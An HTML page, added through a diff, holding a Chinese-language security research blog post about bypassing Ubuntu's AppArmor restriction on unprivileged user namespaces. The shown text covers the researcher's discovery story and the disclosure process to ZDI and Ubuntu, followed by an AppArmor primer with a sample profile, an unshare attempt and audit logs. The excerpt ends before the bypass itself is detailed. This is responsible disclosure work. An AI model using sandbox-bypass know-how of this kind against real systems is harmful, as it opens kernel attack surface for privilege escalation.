@@ -1,0 +1,1338 @@
+
+
+<!DOCTYPE html>
+<html class="no-js sub-menu">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta charset="utf-8" />
+    <link href="/images/favicon.png" rel="icon" size="32x32">
+    <!-- web fullscreen -->
+    <meta name="apple-mobile-web-app-capable" content="yes"><!-- ios -->
+    <meta name="mobile-web-app-capable" content="yes"><!-- android -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0" />
+    <meta name="format-detection" content="telephone=no">
+    <title>The Journey of Bypassing Ubuntu’s Unprivileged Namespace Restriction | DEVCORE 戴夫寇爾</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <script src="/js/modernizr-custom.js"></script>
+    <script src="/js/jquery-3.6.0.min.js"></script>
+    <script src="/js/site.js"></script>
+    <meta name="description" property="og:description" content="近期 Ubuntu 實作了新的沙盒機制來減少攻擊面，然而其乍看之下堅不可摧，但經過研究後發現，繞過方式並沒有想像中那麼困難！本文將介紹我們如何從核心層級著手找出繞過方法，並分享研究過程中遇到的一些有趣故事。" />
+    <meta name="keywords" content="Ubuntu, AppArmor, user namespace, unprivileged namespace, sandbox bypass, Linux LPE, Ubuntu 24.10, Ubuntu 25.04, AppArmor profile, Linux kernel patch, privilege escalation, ZDI, CVE, unshare, aa_change_profile, Linux sandbox escape, AppArmor bypass, Pwn2Own" />
+    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
+    <meta property="og:title" content="The Journey of Bypassing Ubuntu’s Unprivileged Namespace Restriction | DEVCORE 戴夫寇爾" />
+    <meta property="og:url" content="https://devco.re/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction/" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="https://devco.re/assets/img/blog/20250626/cover.png" />
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="d3vc0r3">
+    <meta name="twitter:title" content="The Journey of Bypassing Ubuntu’s Unprivileged Namespace Restriction | DEVCORE 戴夫寇爾">
+    <meta name="twitter:description" content="近期 Ubuntu 實作了新的沙盒機制來減少攻擊面，然而其乍看之下堅不可摧，但經過研究後發現，繞過方式並沒有想像中那麼困難！本文將介紹我們如何從核心層級著手找出繞過方法，並分享研究過程中遇到的一些有趣故事。">
+    <meta name="twitter:creator" content="d3vc0r3">
+    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20250626/cover.png">
+    <meta name="twitter:domain" content="devco.re">
+    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
+    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
+    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
+    <meta name='yandex-verification' content='4561963cf1d18fe3' />
+    <meta property="fb:admins" content="120968921404653" />
+
+    <link rel="canonical" href="https://devco.re/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction/"/>
+    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GHXJ9PS005"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-GHXJ9PS005');
+    </script>
+    <link rel="stylesheet" href="/fonts/inter.css" />
+    <link rel="stylesheet" href="/css/highlighter.css" />
+    <!-- <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script> -->
+</head>
+<body>
+    <!-- 導覽列 start -->
+    <header class="header">
+<div class="container">
+    <!-- logo start -->
+    <div class="logo">
+        <a href="/">
+            <img src="/images/logo.svg"/>
+        </a>
+    </div>
+    <!-- logo end -->
+    <!-- 主選單 start -->
+    <nav class="nav">
+        <ul class="menu">
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>服務<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/services/red-team/">
+                            <div class="item">
+
+                                <h2>
+                                    <i class="icon menu service-red-team"></i>
+                                    紅隊演練
+                                </h2>
+                                <p class="two-line">
+                                    在不影響企業營運前提下，無所不用其極，從各種進入點執行模擬入侵攻擊，達成企業指定的演練情境。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/services/penetration-test/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-penetration-test"></i>
+                                    滲透測試
+                                </h2>
+                                <p class="two-line">
+                                    以駭客思維及手法嘗試入侵企業指定系統，找出潛在漏洞，驗證企業資料與設備是否可被竊取或破壞。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/services/security-consulting/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-security-consulting"></i>
+                                    資安顧問服務
+                                </h2>
+                                <p class="two-line">
+                                    以紅隊演練為基礎，提供攻擊者視角與可能入侵路徑，協助企業評估資安資源優先順序，並擬定長期防禦策略。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/services/security-training/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-security-training"></i>
+                                    資安教育訓練
+                                </h2>
+                                <p class="two-line">
+                                    從攻擊思維出發，協助企業有效預防資安事故並防禦；以及事件發生時，如何快速判定攻擊目的、手法、漏洞與及應變方式。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="https://training.devco.re/" target="_blank">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu offsec"></i>
+                                    OffSec 駭客技術課程 <i class="icon open-in-new"></i>
+                                </h2>
+                                <p class="two-line">
+                                    攜手全球網路安全培訓及認證商 OffSec，透過 Live Training 原廠講師實體授課及線上課程的結構化學習資源，讓資安人員的網路安全攻擊技術與時俱進。
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>研究<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/research/overview/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu search-circle"></i>
+                                    總覽概要
+                                </h2>
+                                <p class="two-line">
+                                    持續精研資安最新技術及漏洞研究趨勢，全方位檢測企業產品安全性、吸取經驗並轉化為紅隊演練工具與手法。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/research/awards/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu badge-check"></i>
+                                    競賽與獎項
+                                </h2>
+                                <p class="two-line">
+                                    國際級資訊安全競賽獎項肯定。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/research/bug-bounty/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu puzzle"></i>
+                                    企業漏洞回報
+                                </h2>
+                                <p class="two-line">
+                                    研究企業系統中的資安風險及各種可能的突破口，並通報企業修補。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/research/talks/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu globe"></i>
+                                    國際研討會
+                                </h2>
+                                <p class="two-line">
+                                    參與全球資安盛會，發表、交流漏洞的知識與資訊。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/research/cve/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu view-list"></i>
+                                    CVE 漏洞列表
+                                </h2>
+                                <p class="two-line">
+                                    挖掘並回報國際知名產品與服務的重大漏洞。
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+
+
+            </li>
+
+            <li class="dropdown">
+                <div class="menuLable" href="#">
+                    <span>公司<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/company/about/">
+                        <div class="item">
+                            <h2>
+                                <i class="icon menu company"></i>
+                                公司簡介
+                            </h2>
+                            <p>
+                                DEVCORE 戴夫寇爾由世界級白帽駭客團隊創立，提供紅隊演練、滲透測試、資安顧問服務、資安教育訓練等服務。
+                            </p>
+                        </div>
+                        </a>
+                        <a href="/company/our-team/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu team"></i>
+                                    團隊成員
+                                </h2>
+                                <p class="two-line">
+                                    由熱衷挑戰、具備駭客思維的資安專家組成，專注於創新攻擊手法研究，並以「高道德、高自律、高嚴謹」為最高指導原則。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/company/history/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu milestone"></i>
+                                    成就與沿革
+                                </h2>
+                                <p class="two-line">
+                                    長期聚焦於攻擊研究，屢屢獲邀參與全球知名資安研討會，已揭露數百個重要產品漏洞、協助企業提升防禦能量。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/company/csr/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu heart"></i>
+                                    企業社會責任
+                                </h2>
+                                <p class="two-line">
+                                    提供多元實習管道和研習計畫，提升新世代人才資安能量，推廣資訊安全意識。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/company/jobs/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu briefcase"></i>
+                                    工作機會
+                                </h2>
+                                <p class="two-line">
+                                    加入 DEVCORE，共同改善資安產業結構，與我們一起打造更安全的世界。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="https://conf.devco.re/" target="_blank">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu conference"></i>
+                                    攻擊導向技術研討會 <i class="icon open-in-new"></i>
+                                </h2>
+                                <p class="two-line">
+                                    由 DEVCORE 舉辦的技術研討會，聚焦於技術並由駭客視角出發，帶您探索創新的攻擊技術與手法，從攻擊思考防禦的策略。
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>新聞<i class="icon arrow_down"></i></span>
+                    <div class="menuItem">
+                        <a href="/blog/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu newspaper"></i>
+                                    BLOG
+                                </h2>
+                                <p>
+                                    DEVCORE 最新消息。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/media-kit/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu download"></i>
+                                    媒體素材下載
+                                </h2>
+                                <p>
+                                    使用 DEVCORE 商標須遵循的使用規範。
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+            <li>
+                <a class="menuLable" href="/search/">搜尋</a>
+            </li>
+            <li>
+                <a class="menuLable" href="/contact/">聯絡我們</a>
+            </li>
+        </ul>
+    </nav>
+    <!-- 主選單 end -->
+</div>
+
+
+<!-- 手機板選單  start-->
+<nav class="nav-m" id="menu-m">
+    <ul class="menu">
+        <li>
+            <div class="menuLable">
+                <span>服務</span>
+                <div class="menuItem">
+                    <a href="/services/red-team/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-red-team"></i>
+                                紅隊演練
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/services/penetration-test/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-penetration-test"></i>
+                                滲透測試
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/services/security-consulting/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-security-consulting"></i>
+                                顧問服務
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/services/security-training/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-security-training"></i>
+                                教育訓練
+                            </h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span>資安研究</span>
+                <div class="menuItem">
+                    <a href="/research/overview/" class="fullwidth">
+                        <div class="item">
+                            <h2>總覽概要</h2>
+                        </div>
+                    </a>
+                    <a href="/research/awards/">
+                        <div class="item">
+                            <h2>競賽與獎項</h2>
+                        </div>
+                    </a>
+                    <a href="/research/bug-bounty/">
+                        <div class="item">
+                            <h2>Bug Bounty</h2>
+                        </div>
+                    </a>
+                    <a href="/research/talks/">
+                        <div class="item">
+                            <h2>國際研討會</h2>
+                        </div>
+                    </a>
+                    <a href="/research/cve/">
+                        <div class="item">
+                            <h2>CVE 漏洞列表</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+
+        <li>
+            <div class="menuLable">
+                <span>公司</span>
+                <div class="menuItem">
+                    <a href="/company/about/" class="fullwidth">
+                        <div class="item">
+                            <h2>公司簡介</h2>
+                        </div>
+                    </a>
+                    <a href="/company/our-team/">
+                        <div class="item">
+                            <h2>團隊成員</h2>
+                        </div>
+                    </a>
+                    <a href="/company/history/">
+                        <div class="item">
+                            <h2>成就與沿革</h2>
+                        </div>
+                    </a>
+                    <a href="/company/csr/">
+                        <div class="item">
+                            <h2>企業社會責任</h2>
+                        </div>
+                    </a>
+                    <a href="/company/jobs/">
+                        <div class="item">
+                            <h2>工作機會</h2>
+                        </div>
+                    </a>
+                    <a href="https://conf.devco.re/" target="_blank">
+                        <div class="item">
+                            <h2>DEVCORE CONFERENCE</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span>新聞</span>
+                <div class="menuItem">
+                    <!-- <a href="/blog/">
+                    <div class="item">
+                        <h2>所有文章</h2>
+                    </div>
+                    </a> -->
+                    <!-- <a href="">
+                        <div class="item">
+                            <h2>案例剖析</h2>
+                        </div>
+                    </a> -->
+                    <!-- <a href="">
+                        <div class="item">
+                            <h2>科普文章</h2>
+                        </div>
+                    </a>
+                    <a href="">
+                        <div class="item">
+                            <h2>技術專欄</h2>
+                        </div>
+                    </a>
+                    <a href="">
+                        <div class="item">
+                            <h2>資安新聞</h2>
+                        </div>
+                    </a> -->
+                    <a href="/blog/">
+                        <div class="item">
+                            <h2>BLOG</h2>
+                        </div>
+                    </a>
+                    <a href="/media-kit/">
+                        <div class="item">
+                            <h2>媒體素材下載</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <div class="menuItem">
+                    <a href="/search/" class="fullwidth">
+                        <div class="item">
+                            <h2 class="center">
+                                <i class="icon search"></i>
+                                搜尋
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/contact/" class="fullwidth">
+                        <div class="item">
+                            <h2 class="center">
+                                <i class="icon chat-alt"></i>
+                                聯絡我們
+                            </h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span><i class="icon translate"></i>Language</span>
+                <div class="menuItem">
+                    <a href="/">
+                    <div class="item">
+                        <h2>中文</h2>
+                    </div>
+                    </a>
+                    <a href="/en">
+                        <div class="item">
+                            <h2>English</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+    </ul>
+</nav>
+<!-- 手機板選單  end-->
+    </header>
+    <!-- 導覽列 end -->
+
+    <!-- tab 選單 start -->
+    <div class="sub-nav">
+        <div class="container">
+            <h1>BLOG</h1>
+            <ul class="tab">
+                <li>
+                    <a href="/blog/">所有文章</a>
+                </li>
+                <li>
+                    <a href="/blog/category/最新消息/">最新消息</a>
+                </li>
+                <li>
+                    <a href="/blog/category/技術專欄/">技術專欄</a>
+                </li>
+                <li>
+                    <a href="/blog/category/科普文章/">科普文章</a>
+                </li>
+                <li>
+                    <a href="/blog/category/資安新聞/">資安新聞</a>
+                </li>
+                <li>
+                    <a href="/blog/category/學生相關計劃/">學生相關計劃</a>
+                </li>
+                <li>
+                    <a href="/media-kit/">媒體素材下載</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+    <!-- tab 選單 end -->
+    
+    <div class="main">
+        <!-- 文章外層layer -->
+        <section class="narrow">
+            <!-- 文章 start -->
+            <article class="article_body">
+                <div class="content">
+                    <a class="category" href="/blog/category/技術專欄">技術專欄</a>
+                    <span class="tag">
+
+                      <a href="/blog/tag/Vulnerability/">#Vulnerability</a> <a href="/blog/tag/Ubuntu/">#Ubuntu</a> <a href="/blog/tag/Advisory/">#Advisory</a> <a href="/blog/tag/Linux/">#Linux</a> <a href="/blog/tag/Kernel/">#Kernel</a> <a href="/blog/tag/AppArmor/">#AppArmor</a> 
+                    </span>
+                    <h1>
+                        The Journey of Bypassing Ubuntu’s Unprivileged Namespace Restriction
+                    </h1>
+                    
+                    
+                    <div class="author_detail">
+                        <span class="avatar">
+                            <a href="/blog/author/pumpkin">
+                                <div class="circle">
+                                    <i class="user" style="background-image: url('/assets/img/avatar/orig/pumpkin.png');" ></i>
+                                </div>
+                            </a>
+                        </span>
+                        <span class="author"><a href="/blog/author/pumpkin">Pumpkin</a></span>
+                        <span class="date">2025-06-26</span>
+                    </div>
+                    
+                    
+                    <div class="article_img">
+                        <img src="https://devco.re/assets/img/blog/20250626/cover.png"/>
+                    </div>
+                    
+
+                    <hr>
+
+                    <!-- 文章內容 -->
+                    <div class="article_content">
+<p><a href="/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction-en/">English Version</a>, <a href="/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction/">中文版本</a></p>
+
+<p>近期 Ubuntu 實作了新的沙盒機制來減少攻擊面，然而其乍看之下堅不可摧，但經過研究後發現，繞過方式並沒有想像中那麼困難！本文將介紹我們如何從核心層級著手找出繞過方法，並分享研究過程中遇到的一些有趣故事。</p>
+
+<h2 id="1-introduction">1. Introduction</h2>
+
+<h3 id="11-ubuntus-new-sandbox-model">1.1. Ubuntu’s New Sandbox Model</h3>
+
+<p>長久以來，Linux 提供了 <strong>非特權使用者命名空間（Unprivileged User Namespace）</strong> 的機制，讓使用者能在隔離環境中執行程式，並且在允許程式在命名空間內可以執行高權限的行為。雖然該機制提供使用者更多的彈性，但因為能與更多子系統或驅動程式互動，也間接暴露出更多核心攻擊面。為了解決此問題，Ubuntu 在 2024 年四月底，也就是 Pwn2Own 結束後不久，發布了一篇<a href="https://ubuntu.com/blog/whats-new-in-security-for-ubuntu-24-04-lts">安全相關的文章</a>，內容提到他們實作了一套基於 AppArmor 的沙盒機制，能有效地限制不受信任的程式使用非特權使用者命名空間和子系統 io_uring，藉此降低潛在的攻擊面。</p>
+
+<p>隨後，在 2024 年九月，Ubuntu 又公開了一份<a href="https://static.sched.com/hosted_files/lsseu2024/ed/Restricting%20Unprivileged%20User%20Namespaces%20In%20Ubuntu.pdf">投影片</a>，進一步深入介紹這套沙盒的架構。內容主要說明了他們目前面臨的問題：攻擊者持續以非特權使用者命名空間為媒介，利用核心模組的漏洞進行提權。此外，他們也詳細解釋了整個保護機制的實作，並評估了導入沙盒後的預期成效。</p>
+
+<p><img src="/assets/img/blog/20250626/upload_42ba484ec23b76cbbb9a0d60184bf5d1.png" alt="" /></p>
+
+<p>由於只有特定程式能建立非特權使用者命名空間，這讓攻擊者能接觸到的核心子系統大幅減少，像是過去經常出現提權漏洞的 netfilter 和 net/sched，再也沒有辦法被存取。這個保護機制看似滴水不漏，甚至讓部分 Linux 核心研究員開始認為，作為歷年來 Pwn2Own 唯一的 Linux 提權目標，Ubuntu 可能已經變得難以被突破。</p>
+
+<h3 id="12-emergence-of-the-bypass-method">1.2. Emergence of the Bypass Method</h3>
+
+<p>然而，就在今年 2 月 16 日，正當我在滑 Twitter 上的文章時，突然看到有人說：這個用 AppArmor 實作的保護機制竟然可以簡單地被繞過！怎麼可能有這種事？這則留言成功引起我的注意了。</p>
+
+<p><img src="/assets/img/blog/20250626/upload_aa9dd31f3f5a20bfe166d06729f5544e.png" alt="" /></p>
+
+<p>如果那位研究員所言屬實，那就代表目前至少有一個繞過方式能繞過沙盒。存在已知解，限時內找出解法，這不就是一道 CTF Misc 題嗎？剛好算了算時間，Pwn2Own 2025 差不多也快開始了，於是我決定著手分析 Ubuntu 是怎麼透過 AppArmor 實作這套限制機制，並嘗試找出該研究員提到的繞過方式，把它當作一道 500 分的 CTF 題來解。</p>
+
+<p>沒想到我想得太難了，繞過手法過於簡單，所以這題大概…只值 100 分吧！雖然我對 AppArmor 的機制不太熟，但因為分析方向很明確，從開始研究到找出繞過方式，整個過程不到三個小時。後來我甚至認為，只要有看到那則推文並實際分析，應該都能找到這個方法。既然能建立非特權使用者命名空間，那接下來的目標就單純不少：從那些 Ubuntu 預設開啟、但 kernelCTF 沒有啟用的網路核心模組上，找一個可以利用的漏洞。看來今年有望再參加一次 Pwn2Own 囉！</p>
+
+<p>又過了幾天，Pwn2Own 總算公布了這次比賽的規則。沒想到這次的 Linux 提權目標竟然不是 Ubuntu，而是換成了 Red Hat Enterprise Linux（RHEL）。又因為 RHEL 沒有針對非特權使用者命名空間做任何限制，因此也不需要什麼繞過方式。也就是說，我剛找到沒多久的繞過方法，變得一點用處都沒有。</p>
+
+<p><img src="/assets/img/blog/20250626/upload_58836702284ef31386e2d2f737ef8883.png" alt="" /></p>
+
+<h3 id="13-vendor-response">1.3. Vendor Response</h3>
+
+<p>當知道 Ubuntu 不再是今年 Pwn2Own 的比賽目標後，我馬上透過 ZDI 回報了這個繞過方法，並預期由 ZDI 跟 Ubuntu 的安全團隊協作進行修復。不過就在等待 ZDI 回覆的這段期間，一開始提到這項保護機制能被繞過的研究員 @roddux，在 3 月 21 日公開了他當初所說的<a href="https://x.com/roddux/status/1903028631514837107">繞過技巧</a>，雖然跟我找到的方法在概念上有些類似，但實際上是不同的成因！幾天後，Qualys Team 也注意到 @roddux 的貼文，並在 3 月 27 日公開了他們早在年初就發現的<a href="https://www.qualys.com/2025/three-bypasses-of-Ubuntu-unprivileged-user-namespace-restrictions.txt">三個繞過手法</a>，還附上了詳細的技術成因說明。原來這些方法早在年初就回報給 Ubuntu 安全團隊，只是一直沒對外公開（可能是因為還在想要怎麼修）。直到類似手法在網路上被公開，他們才釋出當時提交給 Ubuntu 安全團隊的報告。</p>
+
+<p>身為一個研究員，看著一個個繞過技巧和分析細節被公開，我卻因為已經回報給 ZDI 而無法對外分享自己的研究。隔沒幾天，我甚至還沉不住氣寄信給 ZDI，詢問他們是否能取消我的回報。還好 orange 耐心地向我分析取消回報後的優劣，我才找回冷靜，再寄了一封信請他們取消我先前取消回報的要求。</p>
+
+<p>最終 ZDI 在 4 月 27 日審查了我的回報，但他們回覆說他們對這種類型的問題沒興趣，並拒絕後續的處理。沒想到我朝思暮想等了兩個多月，換來的竟然是這種回覆。雖然錯愕，但我還是馬上改回報給 Ubuntu 安全團隊，畢竟這個繞過手法可能還沒被揭露。結果不到一天，我就收到其中一位沙盒機制的維護者 John 的回覆。他表示會立即確認這個問題，並在後續通知我更新的狀況。這是我第一次回報安全漏洞給 Ubuntu，他們積極的處理態度和友善的溝通方式讓整個過程非常順利，與他們合作的感覺非常愉快。</p>
+
+<p>在經過了將近一個月的審查與討論，Ubuntu 安全團隊最後判定我回報的問題，是先前 Qualys Team 發現的繞過手法的變種。這個變種手法需要在特定核心參數 <code class="language-plaintext highlighter-rouge">/proc/sys/kernel/apparmor_restrict_unprivileged_unconfined</code> 被關閉的情況下才會生效。不過這個參數從 Ubuntu 25.04 開始就預設啟用了，因此新版系統不受影響。至於舊版本的 Ubuntu，官方先前曾發布過<a href="https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-restriction/58007#p-148026-restrict-unprivileged-unconfined-profile-changes">說明文章</a>，教使用者如何手動啟用這個參數，避免被類似繞過手法影響。</p>
+
+<p>這篇文章紀錄了我找到繞過手法的方式、技術細節分析以及回報的過程。雖然 Qualys Team 的文章已經涵蓋了這個手法的核心概念，但我認為這篇文章仍有一定的價值，因為我們的分析切入點不同：他們是從使用者空間的應用層面開始分析，而我是從核心出發來理解整個繞過的原理。希望能對各位有幫助！</p>
+
+<h2 id="2-apparmor-101">2. AppArmor 101</h2>
+
+<h3 id="21-overview">2.1. Overview</h3>
+
+<p><strong>AppArmor（Application Armor）</strong> 是一種 Linux 安全模組（Linux Security Module, LSM）的實作，提供強制存取控制（MAC）機制，用來限制程式對系統資源的存取。系統管理員可以為特定程式定義 AppArmor 設定檔（profile），限制它的行為與權限。如果一個程式沒有對應的 AppArmor 設定檔，它會以 <strong><code class="language-plaintext highlighter-rouge">unconfined</code> 設定檔</strong>執行，也就是說 AppArmor 不會對它施加任何限制。</p>
+
+<p>每個 AppArmor 設定檔都針對特定執行檔，定義其存取控制規則，包含存取的檔案、系統能力（capabilities）以及網路權限。啟用的設定檔可以運作於兩種模式之一：</p>
+<ul>
+  <li>強制模式（Enforced mode）：當程式行為違反設定規則時，會被阻擋並記錄下來。</li>
+  <li>回報模式（Complain mode）：違規行為僅會被記錄，不會實際阻擋。</li>
+</ul>
+
+<p>下方以 <code class="language-plaintext highlighter-rouge">ipa_verify</code> 設定檔作為範例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>abi &lt;abi/4.0&gt;,
+include &lt;tunables/global&gt;
+
+profile ipa_verify /usr/bin/ipa_verify flags=(unconfined) {
+  userns,
+
+  # Site-specific additions and overrides. See local/README for details.
+  include if exists &lt;local/ipa_verify&gt;
+}
+</code></pre></div></div>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">profile ipa_verify</code>：定義了一個名為 <code class="language-plaintext highlighter-rouge">ipa_verify</code> 的設定檔。</li>
+  <li><code class="language-plaintext highlighter-rouge">/usr/bin/ipa_verify</code>：這個設定檔套用在 <code class="language-plaintext highlighter-rouge">/usr/bin/ipa_verify</code> 這個執行檔上，當該執行檔被執行時，設定檔會自動載入。</li>
+  <li><code class="language-plaintext highlighter-rouge">flags=(unconfined)</code>：表示這個設定檔處於 unconfined 狀態，也就是雖然載入了設定檔，但實際上不會限制該程式的行為。</li>
+  <li><code class="language-plaintext highlighter-rouge">userns</code>：允許該程式操作使用者命名空間。</li>
+</ul>
+
+<p>使用者可以透過 <code class="language-plaintext highlighter-rouge">aa-status</code> 命令列出目前系統中已啟用的 AppArmor 設定檔及其狀態。以下是一個 JSON 格式的輸出範例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
+    "version": "2",
+    "profiles": {
+        "/snap/snapd/23258/usr/lib/snapd/snap-confine": "enforce",
+        "/usr/sbin/sssd": "complain",
+        "Discord": "unconfined"
+    },
+    "processes": {
+        "/usr/sbin/rsyslogd": [
+            {
+                "profile": "rsyslogd",
+                "pid": "1176",
+                "status": "enforce"
+            }
+        ]
+    }
+}
+</code></pre></div></div>
+
+<h3 id="22-behavior-in-ubuntu">2.2. Behavior in Ubuntu</h3>
+
+<p>使用者可以透過 <code class="language-plaintext highlighter-rouge">unshare</code> 命令，在非特權使用者命名空間下執行任意命令。不過，自從 Ubuntu 引入新的安全機制後，執行這個命令會出現 <strong>“Operation not permitted”（-EPERM）</strong> 錯誤，表示操作被拒絕。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa@aaa:~/<span class="nv">$ </span>unshare <span class="nt">-r</span> <span class="nt">-n</span> <span class="nt">-m</span> /bin/bash
+unshare: write failed /proc/self/uid_map: Operation not permitted
+</code></pre></div></div>
+
+<p>此時如果使用 <code class="language-plaintext highlighter-rouge">dmesg</code> 命令查看核心日誌，會看到與 AppArmor 事件有關的日誌。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa@aaa:~/<span class="nv">$ </span><span class="nb">sudo </span>dmesg
+<span class="o">[</span>...]
+<span class="o">[</span>302291.394909] audit: <span class="nb">type</span><span class="o">=</span>1400 audit<span class="o">(</span>1739761091.573:545<span class="o">)</span>: <span class="nv">apparmor</span><span class="o">=</span><span class="s2">"AUDIT"</span> <span class="nv">operation</span><span class="o">=</span><span class="s2">"userns_create"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"namespace"</span> <span class="nv">info</span><span class="o">=</span><span class="s2">"Userns create - transitioning profile"</span> <span class="nv">profile</span><span class="o">=</span><span class="s2">"unconfined"</span> <span class="nv">pid</span><span class="o">=</span>29466 <span class="nb">comm</span><span class="o">=</span><span class="s2">"unshare"</span> <span class="nv">requested</span><span class="o">=</span><span class="s2">"userns_create"</span> <span class="nv">target</span><span class="o">=</span><span class="s2">"unprivileged_userns"</span>
+<span class="o">[</span>302291.395747] audit: <span class="nb">type</span><span class="o">=</span>1400 audit<span class="o">(</span>1739761091.574:546<span class="o">)</span>: <span class="nv">apparmor</span><span class="o">=</span><span class="s2">"DENIED"</span> <span class="nv">operation</span><span class="o">=</span><span class="s2">"capable"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"cap"</span> <span class="nv">profile</span><span class="o">=</span><span class="s2">"unprivileged_userns"</span> <span class="nv">pid</span><span class="o">=</span>29466 <span class="nb">comm</span><span class="o">=</span><span class="s2">"unshare"</span> <span class="nv">capability</span><span class="o">=</span>21  <span class="nv">capname</span><span class="o">=</span><span class="s2">"sys_admin"</span>
+</code></pre></div></div>
+<ol>
+  <li>第一個 AppArmor 事件：稽核事件（Audit Event）
+    <ul>
+      <li>這筆事件紀錄了執行相關的細節。</li>
+      <li>內容指出，PID 為 29466 的程式（<code class="language-plaintext highlighter-rouge">unshare</code>）試圖建立一個使用者命名空間（<code class="language-plaintext highlighter-rouge">operation="userns_create"</code>）。</li>
+      <li>該程式當下是以 <code class="language-plaintext highlighter-rouge">unconfined</code> 設定檔執行，代表尚未受到任何限制。</li>
+      <li>在這筆事件之後，AppArmor 將該程式指派到 <code class="language-plaintext highlighter-rouge">unprivileged_userns</code> 這設定檔。</li>
+    </ul>
+  </li>
+  <li>第二個 AppArmor 事件：拒絕事件（Deny Event）
+    <ul>
+      <li>這筆事件表示有一個操作被 AppArmor 阻擋。</li>
